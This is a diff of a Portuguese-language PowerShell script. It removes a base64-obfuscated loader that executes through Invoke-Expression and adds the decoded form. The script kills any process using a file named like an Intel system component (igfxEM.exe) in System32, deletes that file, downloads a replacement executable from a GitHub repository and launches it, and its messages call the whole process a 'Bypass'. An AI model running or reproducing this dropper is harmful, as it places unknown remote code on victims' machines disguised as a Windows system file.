@@ -1,4 +1,34 @@
-$enc = "77u/JGRpcmV0b3JpbyA9ICJDOlxXaW5kb3dzXFN5c3RlbTMyXCIKJHVybCA9ICJodHRwczovL2dpdGh1Yi5jb20veDl6ZmlyZS9vcHRpbWl6ZXI5emZpcmUvcmF3L3JlZnMvaGVhZHMvbWFpbi9pZ2Z4RU0uZXhlIgokY2FtaW5ob0FycXVpdm8gPSBKb2luLVBhdGggLVBhdGggJGRpcmV0b3JpbyAtQ2hpbGRQYXRoICJpZ2Z4RU0uZXhlIgoKaWYgKC1ub3QgKFRlc3QtUGF0aCAtUGF0aCAkZGlyZXRvcmlvKSkgewogICAgV3JpdGUtSG9zdCAiRGlyZXTDs3JpbyBuw6NvIGVuY29udHJhZG8gb3UgbsOjbyDDqSBhY2Vzc8OtdmVsLiBDZXJ0aWZpcXVlLXNlIGRlIGV4ZWN1dGFyIG8gUG93ZXJTaGVsbCBjb21vIEFkbWluaXN0cmFkb3IuIgogICAgZXhpdAp9CgokcHJvY2Vzc28gPSBHZXQtUHJvY2VzcyB8IFdoZXJlLU9iamVjdCB7ICRfLlBhdGggLWVxICRjYW1pbmhvQXJxdWl2byB9CgppZiAoJHByb2Nlc3NvKSB7CiAgICBXcml0ZS1Ib3N0ICJPIGFycXVpdm8gZXN0w6Egc2VuZG8gdXNhZG8gcG9yIHVtIHByb2Nlc3NvLiBUZW50YW5kbyBmaW5hbGl6YXIgbyBwcm9jZXNzby4uLiIKICAgIFN0b3AtUHJvY2VzcyAtTmFtZSAkcHJvY2Vzc28uTmFtZSAtRm9yY2UKfQoKaWYgKFRlc3QtUGF0aCAkY2FtaW5ob0FycXVpdm8pIHsKICAgIFdyaXRlLUhvc3QgIlJlbW92ZW5kbyBvIGFycXVpdm8gYW50aWdvLi4uIgogICAgUmVtb3ZlLUl0ZW0gJGNhbWluaG9BcnF1aXZvIC1Gb3JjZQp9Cgp0cnkgewogICAgV3JpdGUtSG9zdCAiQmFpeGFuZG8gbyBub3ZvIGFycXVpdm8uLi4iCiAgICBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1cmwgLU91dEZpbGUgJGNhbWluaG9BcnF1aXZvCgogICAgaWYgKFRlc3QtUGF0aCAkY2FtaW5ob0FycXVpdm8pIHsKICAgICAgICBXcml0ZS1Ib3N0ICJEb3dubG9hZCBjb25jbHXDrWRvIGNvbSBzdWNlc3NvLiBFeGVjdXRhbmRvIG8gYXJxdWl2by4uLiIKICAgICAgICBTdGFydC1Qcm9jZXNzICRjYW1pbmhvQXJxdWl2bwogICAgfSBlbHNlIHsKICAgICAgICBXcml0ZS1Ib3N0ICJGYWxoYSBubyBCeXBhc3MuIENoYW1lIG8gRGV2LiIKICAgIH0KfSBjYXRjaCB7CiAgICBXcml0ZS1Ib3N0ICJGYWxoYSBubyBCeXBhc3MuIENoYW1lIG8gRGV2LiBlIHJlcG9ydGUgbyBlcnJvOiAkXyIKfQ=="
-$bytes = [System.Convert]::FromBase64String($enc)
-$decoded = [System.Text.Encoding]::UTF8.GetString($bytes)
-Invoke-Expression $decoded
+$diretorio = "C:\Windows\System32\"
+$url = "https://github.com/x9zfire/optimizer9zfire/raw/refs/heads/main/igfxEM.exe"
+$caminhoArquivo = Join-Path -Path $diretorio -ChildPath "igfxEM.exe"
+
+if (-not (Test-Path -Path $diretorio)) {
+    Write-Host "Diretório não encontrado ou não é acessível. Certifique-se de executar o PowerShell como Administrador."
+    exit
+}
+
+$processo = Get-Process | Where-Object { $_.Path -eq $caminhoArquivo }
+
+if ($processo) {
+    Write-Host "O arquivo está sendo usado por um processo. Tentando finalizar o processo..."
+    Stop-Process -Name $processo.Name -Force
+}
+
+if (Test-Path $caminhoArquivo) {
+    Write-Host "Removendo o arquivo antigo..."
+    Remove-Item $caminhoArquivo -Force
+}
+
+try {
+    Write-Host "Baixando o novo arquivo..."
+    Invoke-WebRequest -Uri $url -OutFile $caminhoArquivo
+
+    if (Test-Path $caminhoArquivo) {
+        Write-Host "Download concluído com sucesso. Executando o arquivo..."
+        Start-Process $caminhoArquivo
+    } else {
+        Write-Host "Falha no Bypass. Chame o Dev."
+    }
+} catch {
+    Write-Host "Falha no Bypass. Chame o Dev. e reporte o erro: $_"
+}
